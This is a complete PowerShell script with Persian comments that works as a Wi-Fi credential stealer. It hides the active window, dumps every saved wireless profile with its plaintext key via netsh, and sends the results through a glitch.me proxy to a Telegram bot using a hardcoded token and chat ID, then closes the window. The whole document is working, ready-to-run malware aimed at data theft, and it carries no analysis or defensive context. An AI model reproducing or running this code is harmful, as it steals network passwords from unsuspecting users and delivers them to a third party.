Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class CustomWin32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        [DllImport("user32.dll")]
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll", SetLastError=true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    }
"@
# دریافت پنجره فعال و مخفی کردن آن
$HWND = [CustomWin32]::GetForegroundWindow()
[CustomWin32]::ShowWindow($HWND, 6)

# جمع‌آوری پروفایل‌های Wi-Fi
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }

# بررسی وجود پروفایل‌ها
if ($profiles.Count -eq 0) {
    $message = "No Wi-Fi profiles found on this system."
    $proxy_url = "https://stormy-small-turret.glitch.me/"
    $data_to_send = @{
        token = "7071698926:AAHOTiHXShlp4G1cw-2WlHH0P3rxHpqUAw0"
        method = "sendMessage"
        data = @{
            chat_id = "932476037"
            text = $message
        }
    }
    $response = Invoke-RestMethod -Uri $proxy_url -Method Post -Body ($data_to_send | ConvertTo-Json) -ContentType "application/json"
    $WM_CLOSE = 0x0010
    [CustomWin32]::PostMessage($HWND, $WM_CLOSE, 0, 0)
}

# جمع‌آوری جزئیات پروفایل‌ها
$allProfilesInfo = ""
foreach ($profile in $profiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $profileName = ($profileDetails | Select-String "Profile").Line.Split(":")[1].Trim()
    $ssid = ($profileDetails | Select-String "SSID name").Line.Split(":")[1].Trim()
    $authentication = ($profileDetails | Select-String "Authentication").Line.Split(":")[1].Trim()
    $keyContent = ($profileDetails | Select-String "Key Content").Line.Split(":")[1].Trim()
    $allProfilesInfo += @"
Profile Name: $profileName
SSID: $ssid
Authentication: $authentication
Key Content: $keyContent
"@
}

# ارسال اطلاعات به سرور گلیچ
$proxy_url = "https://stormy-small-turret.glitch.me/"
$data_to_send = @{
    token = "7071698926:AAHOTiHXShlp4G1cw-2WlHH0P3rxHpqUAw0"
    method = "sendMessage"
    data = @{
        chat_id = "932476037"
        text = $allProfilesInfo
    }
}
$response = Invoke-RestMethod -Uri $proxy_url -Method Post -Body ($data_to_send | ConvertTo-Json) -ContentType "application/json"

# بستن پنجره فعال
$WM_CLOSE = 0x0010
[CustomWin32]::PostMessage($HWND, $WM_CLOSE, 0, 0)
